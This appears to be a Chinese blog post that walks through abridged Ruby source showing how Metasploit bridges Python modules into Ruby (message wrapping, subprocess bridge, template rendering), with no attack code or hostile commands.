<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">class Msf::Modules::External::Message
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  def self.from_module(j)                                                                                        
</span></span><span class="line"><span class="cl">    if j[&#39;method&#39;]
</span></span><span class="line"><span class="cl">      m = self.new(j[&#39;method&#39;].to_sym)
</span></span><span class="line"><span class="cl">      m.params = j[&#39;params&#39;]
</span></span><span class="line"><span class="cl">      m
</span></span><span class="line"><span class="cl">    elsif j[&#39;response&#39;]
</span></span><span class="line"><span class="cl">      m = self.new(:reply)
</span></span><span class="line"><span class="cl">      m.params = j[&#39;response&#39;]
</span></span><span class="line"><span class="cl">      m.id = j[&#39;id&#39;]
</span></span><span class="line"><span class="cl">      m
</span></span><span class="line"><span class="cl">    end
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  def initialize(m)
</span></span><span class="line"><span class="cl">    self.method = m
</span></span><span class="line"><span class="cl">    self.params = {}
</span></span><span class="line"><span class="cl">    self.id = Base64.strict_encode64(SecureRandom.random_bytes(16))
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  def to_json
</span></span><span class="line"><span class="cl">    params =
</span></span><span class="line"><span class="cl">      if self.params.respond_to? :to_nested_values
</span></span><span class="line"><span class="cl">        self.params.to_nested_values
</span></span><span class="line"><span class="cl">      else
</span></span><span class="line"><span class="cl">        self.params.to_h
</span></span><span class="line"><span class="cl">      end
</span></span><span class="line"><span class="cl">    JSON.generate({jsonrpc: &#39;2.0&#39;, id: self.id, method: self.method, params: params})
</span></span><span class="line"><span class="cl">  end
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个类实际上是对传递给metasploit的信息的一个封装.
<code>initialize</code>是ruby的初始化方法 从这里可以看到它有三个属性<code>method</code> <code>params</code> <code>id</code></p>
<p><code>from_module</code>方法则是用于将传递的参数转换成自身
<code>to_json</code>方法很明显就是转换成一个可用的json(jsonrpc传递需要json格式)</p>
<p>这里是省略了不重要的细节的<code>bridge.rb</code>代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">require &#39;msf/core/modules/external/message&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">class Msf::Modules::External::Bridge
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  # 通过jsonrpc运行
</span></span><span class="line"><span class="cl">  def run(datastore)
</span></span><span class="line"><span class="cl">    unless self.running
</span></span><span class="line"><span class="cl">      m = Msf::Modules::External::Message.new(:run)
</span></span><span class="line"><span class="cl">      m.params = datastore.dup
</span></span><span class="line"><span class="cl">      send(m)
</span></span><span class="line"><span class="cl">      self.running = true
</span></span><span class="line"><span class="cl">    end
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">  # 获取当前状态和恢复run状态  
</span></span><span class="line"><span class="cl">  def get_status
</span></span><span class="line"><span class="cl">    if self.running || !self.messages.empty?
</span></span><span class="line"><span class="cl">      m = receive_notification
</span></span><span class="line"><span class="cl">      if m.nil?
</span></span><span class="line"><span class="cl">        close_ios
</span></span><span class="line"><span class="cl">        self.messages.close
</span></span><span class="line"><span class="cl">        self.running = false
</span></span><span class="line"><span class="cl">      end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      return m
</span></span><span class="line"><span class="cl">    end
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  # 接收
</span></span><span class="line"><span class="cl">  def recv(filter_id=nil, timeout=600)
</span></span><span class="line"><span class="cl">    _, out, err = self.ios
</span></span><span class="line"><span class="cl">    message = &#39;&#39;
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  # jsonrpc发送和接受
</span></span><span class="line"><span class="cl">  def send_receive(message)
</span></span><span class="line"><span class="cl">    send(message)
</span></span><span class="line"><span class="cl">    recv(message.id)
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  # 发送模块元数据
</span></span><span class="line"><span class="cl">  def describe
</span></span><span class="line"><span class="cl">    resp = send_receive(Msf::Modules::External::Message.new(:describe))
</span></span><span class="line"><span class="cl">    close_ios
</span></span><span class="line"><span class="cl">    resp.params
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">  	
</span></span><span class="line"><span class="cl">  # 发送  
</span></span><span class="line"><span class="cl">  def send(message)
</span></span><span class="line"><span class="cl">    input, output, err, status = ::Open3.popen3(self.env, self.cmd)
</span></span><span class="line"><span class="cl">    self.ios = [input, output, err]
</span></span><span class="line"><span class="cl">    self.wait_thread = status
</span></span><span class="line"><span class="cl">    case select(nil, [input], nil, 0.1)
</span></span><span class="line"><span class="cl">    when nil
</span></span><span class="line"><span class="cl">      raise &#34;Cannot run module #{self.path}&#34;
</span></span><span class="line"><span class="cl">    when [[], [input], []]
</span></span><span class="line"><span class="cl">      m = message.to_json
</span></span><span class="line"><span class="cl">      write_message(input, m)
</span></span><span class="line"><span class="cl">    else
</span></span><span class="line"><span class="cl">      raise &#34;Error running module #{self.path}&#34;
</span></span><span class="line"><span class="cl">    end
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  # TODO 这里原本有一大段关于网络接受的代码 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 每个编程语言扩展的具体实现
</span></span><span class="line"><span class="cl">class Msf::Modules::External::PyBridge &lt; Msf::Modules::External::Bridge
</span></span><span class="line"><span class="cl"> # 判断是否是py文件
</span></span><span class="line"><span class="cl">  def self.applies?(module_name)
</span></span><span class="line"><span class="cl">    module_name.match? /\.py$/
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  # 初始化 python扩展添加了额外的路径
</span></span><span class="line"><span class="cl">  def initialize(module_path)
</span></span><span class="line"><span class="cl">    super
</span></span><span class="line"><span class="cl">    pythonpath = ENV[&#39;PYTHONPATH&#39;] || &#39;&#39;
</span></span><span class="line"><span class="cl">    self.env = self.env.merge({ &#39;PYTHONPATH&#39; =&gt; pythonpath + File::PATH_SEPARATOR + File.expand_path(&#39;../python&#39;, __FILE__) })
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">class Msf::Modules::External::Bridge
</span></span><span class="line"><span class="cl">  # 载入列表 我们可以期待更多的语言可以编写msf模块 如Msf::Modules::External::JsBridge?
</span></span><span class="line"><span class="cl">  LOADERS = [
</span></span><span class="line"><span class="cl">    Msf::Modules::External::PyBridge,
</span></span><span class="line"><span class="cl">    Msf::Modules::External::Bridge
</span></span><span class="line"><span class="cl">  ]
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">  # 运行模块方法 让载入的bridge都判断是否是自己所属的 
</span></span><span class="line"><span class="cl">  def self.open(module_path)
</span></span><span class="line"><span class="cl">    LOADERS.each do |klass|
</span></span><span class="line"><span class="cl">      return klass.new module_path if klass.applies? module_path
</span></span><span class="line"><span class="cl">    end
</span></span><span class="line"><span class="cl">    nil
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">end
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里是省略了不重要的细节的<code>shim.rb</code>代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">require &#39;msf/core/modules/external/bridge&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">class Msf::Modules::External::Shim
</span></span><span class="line"><span class="cl">  # 将bridge返回的数据生成一个模块
</span></span><span class="line"><span class="cl">  def self.generate(module_path)
</span></span><span class="line"><span class="cl">    mod = Msf::Modules::External::Bridge.open(module_path)
</span></span><span class="line"><span class="cl">    return &#39;&#39; unless mod.meta
</span></span><span class="line"><span class="cl">    # 这里根据模块元数据来选择模板 目前只有3个 元数据获取查看bridge.rb的meta方法 
</span></span><span class="line"><span class="cl">    case mod.meta[&#39;type&#39;]
</span></span><span class="line"><span class="cl">    when &#39;remote_exploit_cmd_stager&#39;
</span></span><span class="line"><span class="cl">      remote_exploit_cmd_stager(mod)
</span></span><span class="line"><span class="cl">    when &#39;capture_server&#39;
</span></span><span class="line"><span class="cl">      capture_server(mod)
</span></span><span class="line"><span class="cl">    when &#39;dos&#39;
</span></span><span class="line"><span class="cl">      dos(mod)
</span></span><span class="line"><span class="cl">    when &#39;scanner.multi&#39;
</span></span><span class="line"><span class="cl">      multi_scanner(mod)
</span></span><span class="line"><span class="cl">    else
</span></span><span class="line"><span class="cl">      # TODO have a nice load error show up in the logs
</span></span><span class="line"><span class="cl">      &#39;&#39;
</span></span><span class="line"><span class="cl">    end
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  # 返回一个模块 erb是ruby的一个代码模板库
</span></span><span class="line"><span class="cl">  def self.render_template(name, meta = {})
</span></span><span class="line"><span class="cl">    template = File.join(File.dirname(__FILE__), &#39;templates&#39;, name)
</span></span><span class="line"><span class="cl">    ERB.new(File.read(template)).result(binding)
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  def self.common_metadata(meta = {})
</span></span><span class="line"><span class="cl">    render_template(&#39;common_metadata.erb&#39;, meta)
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  # 数据转换
</span></span><span class="line"><span class="cl">  def self.mod_meta_common(mod, meta = {})
</span></span><span class="line"><span class="cl">    meta[:path]        = mod.path.dump
</span></span><span class="line"><span class="cl">    meta[:name]        = mod.meta[&#39;name&#39;].dump
</span></span><span class="line"><span class="cl">    meta[:description] = mod.meta[&#39;description&#39;].dump
</span></span><span class="line"><span class="cl">    meta[:authors]     = mod.meta[&#39;authors&#39;].map(&amp;:dump).join(&#34;,\n          &#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    meta[:options]     = mod.meta[&#39;options&#39;].map do |n, o|
</span></span><span class="line"><span class="cl">      &#34;Opt#{o[&#39;type&#39;].camelize}.new(#{n.dump},
</span></span><span class="line"><span class="cl">        [#{o[&#39;required&#39;]}, #{o[&#39;description&#39;].dump}, #{o[&#39;default&#39;].inspect}])&#34;
</span></span><span class="line"><span class="cl">    end.join(&#34;,\n          &#34;)
</span></span><span class="line"><span class="cl">    meta
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> # 渲染膜拜
</span></span><span class="line"><span class="cl">  def self.dos(mod)
</span></span><span class="line"><span class="cl">    meta = mod_meta_common(mod)
</span></span><span class="line"><span class="cl">    meta[:date] = mod.meta[&#39;date&#39;].dump
</span></span><span class="line"><span class="cl">    meta[:references] = mod.meta[&#39;references&#39;].map do |r|
</span></span><span class="line"><span class="cl">      &#34;[#{r[&#39;type&#39;].upcase.dump}, #{r[&#39;ref&#39;].dump}]&#34;
</span></span><span class="line"><span class="cl">    end.join(&#34;,\n          &#34;)
</span></span><span class="line"><span class="cl">    render_template(&#39;dos.erb&#39;, meta)
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">end
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以python模块的运行过程其实是这样的</p>
<ol>
<li>class Msf::Modules::External::Shim获取到了模块路径</li>
<li>调用Msf::Modules::External::Bridge.open</li>
<li>在open方法 Msf::Modules::External::PyBridge::applies判断成功(也就是确认了是python模块)</li>
<li>初始化一个Msf::Modules::External::PyBridge并返回</li>
<li>判断元数据类型 假设是dos 则调用dos方法</li>
<li>调用mod_meta_common方法转换元数据 渲染代码模板</li>
</ol>
<p>我们可以查看<code>dos.erb</code>的内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">require &#39;msf/core/modules/external/bridge&#39;
</span></span><span class="line"><span class="cl">require &#39;msf/core/module/external&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">class MetasploitModule &lt; Msf::Auxiliary
</span></span><span class="line"><span class="cl">  include Msf::Module::External
</span></span><span class="line"><span class="cl">  include Msf::Auxiliary::Dos
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  def initialize
</span></span><span class="line"><span class="cl">    super({
</span></span><span class="line"><span class="cl">	  &lt;%= common_metadata meta %&gt;
</span></span><span class="line"><span class="cl">      &#39;References&#39;  =&gt;
</span></span><span class="line"><span class="cl">        [
</span></span><span class="line"><span class="cl">          &lt;%= meta[:references] %&gt;
</span></span><span class="line"><span class="cl">        ],
</span></span><span class="line"><span class="cl">      &#39;DisclosureDate&#39; =&gt; &lt;%= meta[:date] %&gt;,
</span></span><span class="line"><span class="cl">      })
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      register_options([
</span></span><span class="line"><span class="cl">        &lt;%= meta[:options] %&gt;
</span></span><span class="line"><span class="cl">      ])
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  def run
</span></span><span class="line"><span class="cl">    print_status(&#34;Starting server...&#34;)
</span></span><span class="line"><span class="cl">    mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)
</span></span><span class="line"><span class="cl">    mod.run(datastore)
</span></span><span class="line"><span class="cl">    wait_status(mod)
</span></span><span class="line"><span class="cl">  end
</span></span><span class="line"><span class="cl">end
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以事实上python模块的实现就是将python代码中元数据传递到代码模板 然后实际上调用的还是ruby模板 我们的python文件路径将会出现在</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)
</span></span><span class="line"><span class="cl">mod.run(datastore)
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后通过<code>bridge.run</code>调用.这种扩展方法不但没有失去对ruby模块的强大支持也没丢失python的灵活性 非常好</p>
]]></content></item></channel></rss>